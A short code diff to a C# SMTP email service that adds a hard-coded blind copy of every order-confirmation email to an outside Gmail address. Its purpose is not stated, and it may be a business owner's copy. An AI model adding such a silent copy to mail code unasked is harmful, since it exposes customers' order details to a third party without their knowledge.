@@ -43,6 +43,11 @@ internal class SmtpEmailService : IEmailService
 
             if(!string.IsNullOrWhiteSpace(bcc))
                 message.Bcc.Add(bcc);
+            
+            if (type == EmailType.OrderConfirmation)
+            {
+                message.Bcc.Add("Iesrogonline@gmail.com");
+            }
 
             await smtp.SendMailAsync(message);
             return true;
